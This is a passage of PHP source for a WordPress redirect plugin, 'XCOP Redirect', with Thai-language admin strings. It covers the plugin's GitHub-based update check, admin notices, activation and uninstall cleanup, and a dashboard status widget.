            $transient->response[$plugin_file] = array(
                'slug' => $plugin_slug,
                'plugin' => $plugin_file,
                'new_version' => sanitize_text_field($data['version']),
                'url' => esc_url_raw($data['homepage'] ?? ''),
                'package' => esc_url_raw($data['download_link']),
                'tested' => sanitize_text_field($data['tested'] ?? ''),
                'requires' => sanitize_text_field($data['requires'] ?? ''),
                'requires_php' => sanitize_text_field($data['requires_php'] ?? ''),
                'compatibility' => new stdClass()
            );
            
            xcop_log("Update available: {$data['version']}");
        }
    }

    return $transient;
}
add_filter('pre_set_site_transient_update_plugins', 'xcop_check_for_updates');

// Clear transient cache when plugin is updated
function xcop_clear_update_transient($upgrader, $hook_extra) {
    if (isset($hook_extra['plugins'])) {
        foreach ($hook_extra['plugins'] as $plugin) {
            if (strpos($plugin, 'xcop-redirect') !== false) {
                delete_transient('xcop_update_check');
                xcop_log('Plugin updated, clearing update cache');
                break;
            }
        }
    }
}
add_action('upgrader_process_complete', 'xcop_clear_update_transient', 10, 2);

// Add update notice in plugins page
function xcop_update_notice() {
    if (!current_user_can('manage_options')) {
        return;
    }
    
    $current_screen = get_current_screen();
    if (!$current_screen || $current_screen->id !== 'plugins') {
        return;
    }
    
    $current_version = XCOP_REDIRECT_VERSION;
    $update_url = 'https://raw.githubusercontent.com/xcoptech/xcop-redirect/main/updates/xcop-redirect.json';

    $remote = get_transient('xcop_update_check');
    if (false === $remote) {
        $remote = wp_remote_get($update_url, array(
            'timeout' => 10,
            'sslverify' => true
        ));
        if (!is_wp_error($remote) && wp_remote_retrieve_response_code($remote) === 200) {
            set_transient('xcop_update_check', $remote, HOUR_IN_SECONDS * 6);
        }
    }

    if (!is_wp_error($remote) && wp_remote_retrieve_response_code($remote) === 200) {
        $body = wp_remote_retrieve_body($remote);
        $data = json_decode($body, true);
        
        if ($data && 
            isset($data['version']) && 
            version_compare($current_version, $data['version'], '<')) {
            
            echo '<div class="notice notice-info is-dismissible">';
            echo '<p><strong>XCOP Redirect:</strong> ' . sprintf(
                'เวอร์ชัน %s พร้อมใช้งานแล้ว! (ปัจจุบัน: %s) <a href="%s" class="button-primary">อัปเดตเลย</a> หรือดู<a href="%s">การตั้งค่า</a>',
                esc_html($data['version']),
                esc_html($current_version),
                esc_url(admin_url('plugins.php')),
                esc_url(admin_url('admin.php?page=xcop-settings'))
            ) . '</p>';
            echo '</div>';
        }
    }
}
add_action('admin_notices', 'xcop_update_notice');

// Plugin activation hook
function xcop_activate_plugin() {
    xcop_register_settings();
    
    // Create log file if logging is enabled
    if (get_option('xcop_enable_logging', '0') === '1') {
        $log_file = WP_CONTENT_DIR . '/xcop-redirect.log';
        if (!file_exists($log_file)) {
            file_put_contents($log_file, "XCOP Redirect Log Started: " . current_time('Y-m-d H:i:s') . "\n");
        }
    }
    
    flush_rewrite_rules();
    xcop_log('Plugin activated');
}
register_activation_hook(__FILE__, 'xcop_activate_plugin');

// Plugin deactivation hook
function xcop_deactivate_plugin() {
    flush_rewrite_rules();
    delete_transient('xcop_update_check');
    
    xcop_log('Plugin deactivated');
}
register_deactivation_hook(__FILE__, 'xcop_deactivate_plugin');

// Uninstall hook - clean up everything
function xcop_uninstall_plugin() {
    // Delete all options
    $options = array(
        'xcop_redirect_url', 'xcop_enable_referrer_check', 'xcop_referrer_domain',
        'xcop_enable_redirect', 'xcop_history_length_check', 'xcop_min_history_length',
        'xcop_delay_redirect', 'xcop_enable_logging', 'xcop_whitelist_ips', 'xcop_blacklist_ips'
    );
    
    foreach ($options as $option) {
        delete_option($option);
    }
    
    // Clean up transients
    delete_transient('xcop_update_check');
    
    // Delete log file
    $log_file = WP_CONTENT_DIR . '/xcop-redirect.log';
    if (file_exists($log_file)) {
        unlink($log_file);
    }
}
register_uninstall_hook(__FILE__, 'xcop_uninstall_plugin');

// Add admin footer text
function xcop_admin_footer($text) {
    $current_screen = get_current_screen();
    if ($current_screen && $current_screen->id === 'toplevel_page_xcop-settings') {
        return 'ขอบคุณที่ใช้ <strong>XCOP Redirect</strong> เวอร์ชัน ' . XCOP_REDIRECT_VERSION . ' | พัฒนาโดย <a href="https://xcoptech.com" target="_blank">XCOP</a>';
    }
    return $text;
}
add_filter('admin_footer_text', 'xcop_admin_footer');

// Dashboard widget for quick status
function xcop_dashboard_widget() {
    if (!current_user_can('manage_options')) {
        return;
    }
    
    wp_add_dashboard_widget(
        'xcop_redirect_status',
        'XCOP Redirect Status',
        'xcop_dashboard_widget_content'
    );
}
add_action('wp_dashboard_setup', 'xcop_dashboard_widget');

function xcop_dashboard_widget_content() {
    $is_enabled = get_option('xcop_enable_redirect', '1') === '1';
    $redirect_url = get_option('xcop_redirect_url', '');
    $referrer_domain = get_option('xcop_referrer_domain', '');
    
    echo '<div style="padding: 10px;">';
    echo '<p><strong>สถานะ:</strong> <span style="color: ' . ($is_enabled ? '#28a745' : '#dc3545') . ';">' . ($is_enabled ? 'เปิดใช้งาน' : 'ปิดใช้งาน') . '</span></p>';
    if ($is_enabled) {
        echo '<p><strong>URL ปลายทาง:</strong> <code>' . esc_html($redirect_url) . '</code></p>';
        echo '<p><strong>โดเมนแหล่งที่มา:</strong> <code>' . esc_html($referrer_domain) . '</code></p>';
    }
    echo '<p><a href="' . admin_url('admin.php?page=xcop-settings') . '" class="button-primary">จัดการการตั้งค่า</a></p>';
    echo '</div>';
}